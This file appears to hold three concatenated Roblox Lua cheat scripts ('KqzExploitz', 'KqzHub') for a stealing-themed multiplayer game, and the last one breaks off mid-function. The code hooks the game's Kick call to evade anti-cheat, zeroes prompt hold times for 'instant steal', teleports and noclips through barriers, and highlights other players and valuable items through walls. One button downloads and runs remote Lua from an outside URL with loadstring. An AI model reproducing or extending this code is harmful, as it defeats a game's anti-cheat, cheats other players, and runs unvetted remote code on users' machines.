-- KqzExploitz UI
local player = game.Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Cleanup existing UI
local existing = CoreGui:FindFirstChild("KqzExploitzUI")
if existing then existing:Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KqzExploitzUI"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

-- State Variables
local desyncPos = nil
local playerESP = false
local bestESP = false
local espObjects = {}
local isMinimized = false
local noclip = false
local autoCollect = false

-- App-style Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 500, 0, 350)
MainFrame.Position = UDim2.new(0.5, -250, 0.5, -175)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(45, 45, 45)
UIStroke.Thickness = 1.5
UIStroke.Parent = MainFrame

-- Header
local Header = Instance.new("Frame")
Header.Name = "Header"
Header.Size = UDim2.new(1, 0, 0, 45)
Header.BackgroundTransparency = 1
Header.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -100, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.Text = "KqzExploitz v2"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.BackgroundTransparency = 1
Title.Parent = Header

-- Control Buttons
local Controls = Instance.new("Frame")
Controls.Size = UDim2.new(0, 80, 1, 0)
Controls.Position = UDim2.new(1, -85, 0, 0)
Controls.BackgroundTransparency = 1
Controls.Parent = Header

local function createControl(text, pos, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 28, 0, 28)
    btn.Position = pos
    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.Parent = Controls
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 6)
    c.Parent = btn
    btn.MouseButton1Click:Connect(callback)
end

createControl("-", UDim2.new(0, 0, 0.5, -14), function()
    isMinimized = not isMinimized
    local targetHeight = isMinimized and 45 or 350
    TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Size = UDim2.new(0, 500, 0, targetHeight)}):Play()
    MainFrame.TabContainer.Visible = not isMinimized
    MainFrame.PageContainer.Visible = not isMinimized
end)

createControl("X", UDim2.new(0, 35, 0.5, -14), function()
    ScreenGui:Destroy()
end)

-- Sidebar Tabs
local TabContainer = Instance.new("Frame")
TabContainer.Name = "TabContainer"
TabContainer.Size = UDim2.new(0, 110, 1, -55)
TabContainer.Position = UDim2.new(0, 10, 0, 45)
TabContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TabContainer.BorderSizePixel = 0
TabContainer.Parent = MainFrame

local TabCorner = Instance.new("UICorner")
TabCorner.CornerRadius = UDim.new(0, 10)
TabCorner.Parent = TabContainer

local TabList = Instance.new("UIListLayout")
TabList.Padding = UDim.new(0, 5)
TabList.HorizontalAlignment = Enum.HorizontalAlignment.Center
TabList.Parent = TabContainer

local PageContainer = Instance.new("Frame")
PageContainer.Name = "PageContainer"
PageContainer.Size = UDim2.new(1, -140, 1, -55)
PageContainer.Position = UDim2.new(0, 130, 0, 45)
PageContainer.BackgroundTransparency = 1
PageContainer.Parent = MainFrame

local pages = {}
local function createPage(name)
    local page = Instance.new("ScrollingFrame")
    page.Name = name
    page.Size = UDim2.new(1, 0, 1, 0)
    page.BackgroundTransparency = 1
    page.CanvasSize = UDim2.new(0, 0, 0, 0)
    page.ScrollBarThickness = 2
    page.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 60)
    page.Visible = false
    page.Parent = PageContainer
    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 10)
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    layout.Parent = page
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 5)
    padding.Parent = page
    pages[name] = page
    return page
end

local function showPage(name)
    for n, p in pairs(pages) do p.Visible = (n == name) end
end

local function createTab(name)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9, 0, 0, 32)
    btn.BackgroundTransparency = 1
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(160, 160, 160)
    btn.Font = Enum.Font.GothamSemibold
    btn.TextSize = 13
    btn.Parent = TabContainer
    btn.MouseButton1Click:Connect(function()
        showPage(name)
        for _, t in pairs(TabContainer:GetChildren()) do
            if t:IsA("TextButton") then t.TextColor3 = Color3.fromRGB(160, 160, 160) end
        end
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)
    return btn
end

-- Create Pages & Tabs
local tabs = {"Main", "Automation", "Combat", "Visuals", "Settings"}
local activeTab = nil
for _, name in pairs(tabs) do
    local tabBtn = createTab(name)
    if not activeTab then activeTab = tabBtn end
    createPage(name)
end
activeTab.TextColor3 = Color3.fromRGB(255, 255, 255)
showPage("Main")

-- Helper: UI Elements
local function createButton(parent, text, callback)
    local btnFrame = Instance.new("Frame")
    btnFrame.Size = UDim2.new(0.95, 0, 0, 40)
    btnFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    btnFrame.Parent = parent
    Instance.new("UICorner", btnFrame).CornerRadius = UDim.new(0, 8)
    local stroke = Instance.new("UIStroke", btnFrame)
    stroke.Color = Color3.fromRGB(40, 40, 40)
    local button = Instance.new("TextButton", btnFrame)
    button.Size = UDim2.new(1, 0, 1, 0)
    button.BackgroundTransparency = 1
    button.Text = text
    button.TextColor3 = Color3.fromRGB(200, 200, 200)
    button.Font = Enum.Font.GothamSemibold
    button.TextSize = 13
    button.MouseButton1Click:Connect(callback)
end

local function createToggle(parent, text, default, callback)
    local frame = Instance.new("Frame", parent)
    frame.Size = UDim2.new(0.95, 0, 0, 40)
    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(0.7, 0, 1, 0)
    label.Position = UDim2.new(0, 10, 0, 0)
    label.Text = text
    label.TextColor3 = Color3.fromRGB(200, 200, 200)
    label.Font = Enum.Font.GothamSemibold
    label.TextSize = 13
    label.BackgroundTransparency = 1
    label.TextXAlignment = Enum.TextXAlignment.Left
    local state = default
    local toggleBtn = Instance.new("TextButton", frame)
    toggleBtn.Size = UDim2.new(0, 40, 0, 20)
    toggleBtn.Position = UDim2.new(1, -50, 0.5, -10)
    toggleBtn.BackgroundColor3 = state and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(50, 50, 50)
    toggleBtn.Text = ""
    Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1, 0)
    toggleBtn.MouseButton1Click:Connect(function()
        state = not state
        toggleBtn.BackgroundColor3 = state and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(50, 50, 50)
        callback(state)
    end)
end

-- Anti-Cheat Bypass: Anti-Kick Hook
local function bypassAntiCheat()
    local g = getgenv and getgenv() or _G
    if g then g.AntiKick = true end
    local old; old = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        if not checkcaller() and method == "Kick" then return nil end
        return old(self, ...)
    end)
end

-- Instant Steal Integration
local function instantSteal()
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") then
            obj.HoldDuration = 0
            obj.ClickablePrompt = true
        end
    end
end

-- Carpet-State Teleport Bypass (Optimized for Lag and Hand-Item)
local function carpetTeleportBypass(targetCFrame)
    local char = player.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local hrp = char.HumanoidRootPart
    local hum = char:FindFirstChild("Humanoid")
    local backpack = player:WaitForChild("Backpack")
    
    -- Optimize Performance: Batch equip
    local carpet = char:FindFirstChild("Flying Carpet") or backpack:FindFirstChild("Flying Carpet")

    task.spawn(function()
        -- 1. Anti-Kick Bypass Protection
        bypassAntiCheat()
        
        -- 2. State Prep (Prevent Death/Break)
        hrp.Velocity = Vector3.new(0, 0, 0)
        if hum then
            hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
            hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
            hum:ChangeState(Enum.HumanoidStateType.Physics)
        end
        
        -- 3. Automatic Carpet/Item Handling
        -- If holding brainrot, tool equipping might be restricted, but we force it if possible
        if carpet and carpet.Parent ~= char then
            hum:EquipTool(carpet)
            task.wait(0.1)
        end
        
        -- 4. Vertical Bypass (Teleport UP)
        local skyPos = hrp.Position + Vector3.new(0, 1000, 0)
        hrp.CFrame = CFrame.new(skyPos)
        task.wait(0.05)
        
        -- 5. Physical Anchor (Prevents Pullback)
        local platform = Instance.new("Part")
        platform.Size = Vector3.new(20, 1, 20)
        platform.CFrame = targetCFrame * CFrame.new(0, -3.5, 0)
        platform.Transparency = 1
        platform.Anchored = true
        platform.CanCollide = true
        platform.Parent = workspace
        
        -- 6. Instant Hop with State Spoof (Chunking for Anti-Cheat)
        local startPos = hrp.Position
        local endPos = targetCFrame.Position
        local totalDist = (endPos - startPos).Magnitude
        local chunks = math.ceil(totalDist / 15)
        
        -- Performance Optimization: Use a single update loop instead of multiple wait steps
        for i = 1, chunks do
            local nextPos = startPos:Lerp(endPos, i / chunks)
            hrp.CFrame = CFrame.new(nextPos) * targetCFrame.Rotation
        end
        hrp.CFrame = targetCFrame
        
        -- 7. Stabilization Wait
        task.wait(0.4)
        if hum then hum:ChangeState(Enum.HumanoidStateType.GettingUp) end
        platform:Destroy()
        hrp.Velocity = Vector3.new(0, 0, 0)
    end)
end

-- Main Section
createButton(pages.Main, "Respawn Desync", function()
    local char = player.Character
    if char and char:FindFirstChild("Humanoid") then
        char.Humanoid.Health = 0
        local newChar = player.CharacterAdded:Wait()
        local hrp = newChar:WaitForChild("HumanoidRootPart")
        task.wait(0.5)
        desyncPos = hrp.CFrame
        local desyncPart = Instance.new("Part", workspace)
        desyncPart.Size = Vector3.new(2, 6, 2)
        desyncPart.CFrame = desyncPos
        desyncPart.Anchored = true
        desyncPart.Transparency = 0.5
        desyncPart.Color = Color3.fromRGB(0, 255, 255)
        desyncPart.Material = Enum.Material.Neon
    end
end)

createButton(pages.Main, "Carpet Bypass TP 💨", function()
    if desyncPos then carpetTeleportBypass(desyncPos) end
end)

-- Automation Section
createButton(pages.Automation, "Instant Steal 🧠", instantSteal)
createToggle(pages.Automation, "Auto Collect Cash", false, function(v) autoCollect = v end)

-- Combat Section
createButton(pages.Combat, "Bypass Anti-Cheat 🛡️", bypassAntiCheat)
createButton(pages.Combat, "Anti-Hit", function()
    RunService.Stepped:Connect(function()
        if player.Character then
            for _, v in pairs(player.Character:GetDescendants()) do
                if v:IsA("BasePart") then v.CanTouch = false end
            end
        end
    end)
end)
createToggle(pages.Combat, "Noclip", false, function(v) noclip = v end)

-- Visuals Section (Performance Optimized)
createToggle(pages.Visuals, "Player ESP", false, function(v)
    playerESP = v
    if not v then 
        for _, obj in pairs(espObjects) do if obj and obj:IsA("Highlight") then obj:Destroy() end end 
        espObjects = {}
    else
        task.spawn(function()
            while playerESP do
                for _, p in pairs(game.Players:GetPlayers()) do
                    if p ~= player and p.Character and not p.Character:FindFirstChild("ESPHighlight") then
                        local h = Instance.new("Highlight", p.Character)
                        h.Name = "ESPHighlight"
                        h.FillColor = Color3.new(1, 0, 0)
                        table.insert(espObjects, h)
                    end
                end
                task.wait(2) -- Optimized wait
            end
        end)
    end
end)

createToggle(pages.Visuals, "ESP Best Brainrot 💎", false, function(v)
    bestESP = v
    if not v then 
        for _, obj in pairs(espObjects) do if obj and obj.Name == "BestBrainrotESP" then obj:Destroy() end end 
    else
        task.spawn(function()
            while bestESP do
                local best, max = nil, -1
                for _, obj in pairs(workspace:GetDescendants()) do
                    if obj:IsA("Model") and (obj.Name == "BrainrotModel" or obj:FindFirstChild("Value")) then
                        local val = obj:FindFirstChild("Value")
                        if val and val.Value > max then
                            max = val.Value
                            best = obj
                        end
                    end
                end
                if best then
                    for _, obj in pairs(espObjects) do if obj and obj.Name == "BestBrainrotESP" then obj:Destroy() end end
                    local h = Instance.new("Highlight", best)
                    h.Name = "BestBrainrotESP"
                    h.FillColor = Color3.fromRGB(255, 215, 0)
                    h.OutlineColor = Color3.new(1, 1, 1)
                    table.insert(espObjects, h)
                    
                    local bg = best:FindFirstChild("ESPLabel") or Instance.new("BillboardGui", best)
                    bg.Name = "ESPLabel"
                    bg.Size = UDim2.new(0, 200, 0, 50)
                    bg.AlwaysOnTop = true
                    bg.ExtentsOffset = Vector3.new(0, 3, 0)
                    local tl = bg:FindFirstChild("Text") or Instance.new("TextLabel", bg)
                    tl.Name = "Text"
                    tl.Size = UDim2.new(1, 0, 1, 0)
                    tl.BackgroundTransparency = 1
                    tl.Text = "💎 HIGHEST VALUE 💎\n$"..max.."/s"
                    tl.TextColor3 = Color3.new(1, 1, 0)
                    tl.Font = Enum.Font.GothamBold
                    tl.TextSize = 14
                    table.insert(espObjects, bg)
                end
                task.wait(3) -- Performance optimized
            end
        end)
    end
end)

-- Loops & Barrier Bypassing (Performance Optimized)
RunService.Stepped:Connect(function()
    if player.Character then
        if noclip then
            for _, v in pairs(player.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end
        end
        -- Barrier bypass only for nearby objects to reduce lag
        local hrp = player.Character.HumanoidRootPart
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and (v.Name:lower():find("laser") or v.Name:lower():find("barrier") or v.Name:lower():find("wall") or v.Name:lower():find("door")) then
                if (v.Position - hrp.Position).Magnitude < 30 then
                    v.CanCollide = false
                    v.Transparency = 0.5
                end
            end
        end
    end
end)

-- Settings Section
createButton(pages.Settings, "Unload UI", function() ScreenGui:Destroy() end)

-- Dragging Logic
local dragging, dragInput, dragStart, startPos
MainFrame.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true dragStart = input.Position startPos = MainFrame.Position end end)
UserInputService.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end end)
UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
RunService.Heartbeat:Connect(function() if dragging and dragInput then local delta = dragInput.Position - dragStart MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)






local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local GuiService = game:GetService("GuiService")
local RunService = game:GetService("RunService")

local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
local Humanoid = Character:WaitForChild("Humanoid")

-- Cleanup duplicate UI
if CoreGui:FindFirstChild("BrainrotScriptUI") then
    CoreGui.BrainrotScriptUI:Destroy()
end

-- Update character references on respawn
Player.CharacterAdded:Connect(function(char)
    Character = char
    HumanoidRootPart = char:WaitForChild("HumanoidRootPart")
    Humanoid = char:WaitForChild("Humanoid")
end)

local SavedPosition = nil

-- UI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BrainrotScriptUI"
ScreenGui.Parent = CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.BorderSizePixel = 1
MainFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -130)
MainFrame.Size = UDim2.new(0, 220, 0, 320)
MainFrame.Active = true

-- Mobile Toggle Button
local MobileToggle = Instance.new("TextButton")
MobileToggle.Name = "MobileToggle"
MobileToggle.Parent = ScreenGui
MobileToggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MobileToggle.Size = UDim2.new(0, 50, 0, 50)
MobileToggle.Position = UDim2.new(0, 10, 0.5, -25)
MobileToggle.Text = "Menu"
MobileToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
MobileToggle.Font = Enum.Font.GothamBold
MobileToggle.Visible = UserInputService.TouchEnabled

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(0, 25)
ToggleCorner.Parent = MobileToggle

MobileToggle.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)

-- Modern Drag Logic
local dragging, dragInput, dragStart, startPos
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Font = Enum.Font.GothamBold
Title.Text = "💰KqzExploitzz"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18

local ButtonList = Instance.new("ScrollingFrame")
ButtonList.Name = "ButtonList"
ButtonList.Parent = MainFrame
ButtonList.BackgroundTransparency = 1
ButtonList.BorderSizePixel = 0
ButtonList.Position = UDim2.new(0, 10, 0, 50)
ButtonList.Size = UDim2.new(1, -20, 1, -60)
ButtonList.ScrollBarThickness = 2
ButtonList.CanvasSize = UDim2.new(0, 0, 0, 0)
ButtonList.AutomaticCanvasSize = Enum.AutomaticSize.Y

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = ButtonList
UIListLayout.Padding = UDim.new(0, 10)
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local function CreateButton(text, color)
    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(1, 0, 0, 40)
    Button.BackgroundColor3 = color or Color3.fromRGB(0, 0, 0)
    Button.Font = Enum.Font.GothamSemibold
    Button.Text = text
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.TextSize = 14
    Button.AutoButtonColor = true
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 6)
    Corner.Parent = Button
    
    local Stroke = Instance.new("UIStroke")
    Stroke.Color = Color3.fromRGB(255, 255, 255)
    Stroke.Thickness = 1
    Stroke.Parent = Button
    
    Button.Parent = ButtonList
    return Button
end

-- 0. Respawn Desync - EXTERNAL MODULE INTEGRATION
local DesyncBtn = CreateButton("Desync", Color3.fromRGB(80, 40, 40))
DesyncBtn.MouseButton1Click:Connect(function()
    DesyncBtn.Text = "Desyncing... 👻"
    pcall(function()
        loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/6259444f60f0e2ae06855fcb0d84eaaa6d51167d23dae82e2f07cc58b8ce6fa1/download"))()
    end)
    task.wait(1)
    DesyncBtn.Text = "Desync"
end)

-- 1. Save Position
local SaveBtn = CreateButton("Save", Color3.fromRGB(40, 40, 40))
SaveBtn.MouseButton1Click:Connect(function()
    if Character and HumanoidRootPart then
        SavedPosition = HumanoidRootPart.CFrame
        SaveBtn.Text = "Saved! ✅"
        task.wait(1)
        SaveBtn.Text = "Save"
    end
end)

-- 2. Teleport To Saved (Instant TP💨)
local TPBtn = CreateButton("Instant TP💨", Color3.fromRGB(60, 60, 60))
TPBtn.MouseButton1Click:Connect(function()
    if not SavedPosition then return end
    if Character and HumanoidRootPart and Humanoid then
        local carpet = Character:FindFirstChild("Flying Carpet") or Player.Backpack:FindFirstChild("Flying Carpet")
        
        if carpet and carpet.Parent == Player.Backpack then
            carpet.Parent = Character
        end

        local noclipConnection
        noclipConnection = RunService.Stepped:Connect(function()
            if Character then
                for _, part in pairs(Character:GetDescendants()) do
                    if part:IsA("BasePart") then part.CanCollide = false end
                end
            end
        end)

        Humanoid.PlatformStand = true
        
        for i = 1, 35 do
            if HumanoidRootPart then
                HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
                HumanoidRootPart.CFrame = SavedPosition
            end
            RunService.Heartbeat:Wait()
        end
        
        if noclipConnection then noclipConnection:Disconnect() end
        if Character then
            for _, part in pairs(Character:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = true end
            end
        end
        
        Humanoid.PlatformStand = false
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
        HumanoidRootPart.Velocity = Vector3.new(0,0,0)
        
        TPBtn.Text = "TP Successful! 💨"
        task.wait(1)
        TPBtn.Text = "Instant TP💨"
    end
end)

-- ESP States
local brainrotESPActive = false
local playerESPActive = false

-- Optimized ESP Tracking
local BrainrotHighlights = {}
local PlayerHighlights = {}

local function applyBrainrotESP(obj)
    if not brainrotESPActive then return end
    local name = obj.Name:lower()
    if obj:IsA("BasePart") and (name:find("brain") or name:find("rot") or name:find("steal") or name:find("item") or name:find("collect")) then
        local target = obj.Parent:IsA("Model") and obj.Parent or obj
        if not target:FindFirstChild("BrainrotESP") then
            local highlight = Instance.new("Highlight")
            highlight.Name = "BrainrotESP"
            highlight.FillColor = Color3.fromRGB(255, 255, 255)
            highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
            highlight.Parent = target
            table.insert(BrainrotHighlights, highlight)
        end
    end
end

local function applyPlayerESP(pChar)
    if not playerESPActive or not pChar then return end
    if not pChar:FindFirstChild("PlayerESP") then
        local highlight = Instance.new("Highlight")
        highlight.Name = "PlayerESP"
        highlight.FillColor = Color3.fromRGB(200, 200, 200)
        highlight.Adornee = pChar
        highlight.Parent = pChar
        table.insert(PlayerHighlights, highlight)
    end
end

-- Listeners
workspace.DescendantAdded:Connect(function(obj)
    task.wait(0.1)
    applyBrainrotESP(obj)
end)

Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function(char)
        task.wait(0.5)
        applyPlayerESP(char)
    end)
end)

for _, p in pairs(Players:GetPlayers()) do
    if p ~= Player then
        p.CharacterAdded:Connect(function(char)
            task.wait(0.5)
            applyPlayerESP(char)
        end)
    end
end

-- 3. Esp Best
local ESPBrainrotBtn = CreateButton("Esp Best", Color3.fromRGB(40, 40, 40))
ESPBrainrotBtn.MouseButton1Click:Connect(function()
    brainrotESPActive = not brainrotESPActive
    ESPBrainrotBtn.BackgroundColor3 = brainrotESPActive and Color3.fromRGB(100, 100, 100) or Color3.fromRGB(40, 40, 40)
    if brainrotESPActive then
        for _, obj in pairs(workspace:GetDescendants()) do applyBrainrotESP(obj) end
    else
        for _, h in pairs(BrainrotHighlights) do if h and h.Parent then h:Destroy() end end
        BrainrotHighlights = {}
    end
end)

-- 4. ESP Player
local ESPPlayerBtn = CreateButton("ESP Player", Color3.fromRGB(40, 40, 40))
ESPPlayerBtn.MouseButton1Click:Connect(function()
    playerESPActive = not playerESPActive
    ESPPlayerBtn.BackgroundColor3 = playerESPActive and Color3.fromRGB(100, 100, 100) or Color3.fromRGB(40, 40, 40)
    if playerESPActive then
        for _, p in pairs(Players:GetPlayers()) do if p ~= Player and p.Character then applyPlayerESP(p.Character) end end
    else
        for _, h in pairs(PlayerHighlights) do if h and h.Parent then h:Destroy() end end
        PlayerHighlights = {}
    end
end)

-- Toggle UI
UserInputService.InputBegan:Connect(function(input, gpe)
    if not gpe then
        if input.KeyCode == Enum.KeyCode.K or input.KeyCode == Enum.KeyCode.ButtonSelect then
            MainFrame.Visible = not MainFrame.Visible
        end
    end
end)












local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

-- UI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KqzHub"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 360, 0, 480)
MainFrame.Position = UDim2.new(0.5, -180, 0.5, -240)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui
MainFrame.ClipsDescendants = true
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundTransparency = 0.05
MainFrame.Name = "MainFrame"
MainFrame.AutomaticSize = Enum.AutomaticSize.Y

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 14)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(70, 70, 80)
UIStroke.Thickness = 2
UIStroke.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundTransparency = 1
Title.Text = "KqzHub"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 28
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Parent = MainFrame
Title.Name = "Title"
Title.TextStrokeTransparency = 0.75

local Divider = Instance.new("Frame")
Divider.Size = UDim2.new(1, -40, 0, 2)
Divider.Position = UDim2.new(0, 20, 0, 50)
Divider.BackgroundColor3 = Color3.fromRGB(70, 70, 80)
Divider.BorderSizePixel = 0
Divider.Parent = MainFrame

local FeaturesFrame = Instance.new("ScrollingFrame")
FeaturesFrame.Size = UDim2.new(1, -40, 1, -70)
FeaturesFrame.Position = UDim2.new(0, 20, 0, 60)
FeaturesFrame.BackgroundTransparency = 1
FeaturesFrame.BorderSizePixel = 0
FeaturesFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
FeaturesFrame.ScrollBarThickness = 6
FeaturesFrame.Parent = MainFrame
FeaturesFrame.Name = "FeaturesFrame"
FeaturesFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 12)
UIListLayout.Parent = FeaturesFrame

-- Utility function to create buttons
local function createButton(text, sizeX, sizeY)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(0, sizeX, 0, sizeY)
	btn.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
	btn.BorderSizePixel = 0
	btn.AutoButtonColor = false
	btn.Font = Enum.Font.GothamSemibold
	btn.TextSize = 16
	btn.TextColor3 = Color3.fromRGB(220, 220, 220)
	btn.Text = text
	btn.Name = text:gsub("%s+", ""):gsub("[^%w]", "")
	btn.ClipsDescendants = true

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = btn

	local stroke = Instance.new("UIStroke")
	stroke.Color = Color3.fromRGB(90, 90, 100)
	stroke.Thickness = 1
	stroke.Parent = btn

	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(65, 65, 75)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 50)}):Play()
	end)

	return btn
end

-- Feature container creation
local function createFeature(titleText, scriptCode)
	local container = Instance.new("Frame")
	container.Size = UDim2.new(1, 0, 0, 110)
	container.BackgroundColor3 = Color3.fromRGB(38, 38, 44)
	container.BorderSizePixel = 0
	container.Name = titleText:gsub("%s+", ""):gsub("[^%w]", "") .. "Container"

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 12)
	corner.Parent = container

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, -20, 0, 30)
	title.Position = UDim2.new(0, 10, 0, 10)
	title.BackgroundTransparency = 1
	title.Text = titleText
	title.Font = Enum.Font.GothamBold
	title.TextSize = 20
	title.TextColor3 = Color3.fromRGB(230, 230, 230)
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = container

	local toggleBtn = createButton("Show Script", 120, 30)
	toggleBtn.Position = UDim2.new(1, -130, 0, 10)
	toggleBtn.Parent = container

	local scriptFrame = Instance.new("Frame")
	scriptFrame.Size = UDim2.new(1, -20, 0, 60)
	scriptFrame.Position = UDim2.new(0, 10, 0, 50)
	scriptFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 33)
	scriptFrame.BorderSizePixel = 0
	scriptFrame.Visible = false
	scriptFrame.Parent = container

	local scriptCorner = Instance.new("UICorner")
	scriptCorner.CornerRadius = UDim.new(0, 10)
	scriptCorner.Parent = scriptFrame

	local scriptTextBox = Instance.new("TextBox")
	scriptTextBox.Size = UDim2.new(1, -20, 1, -20)
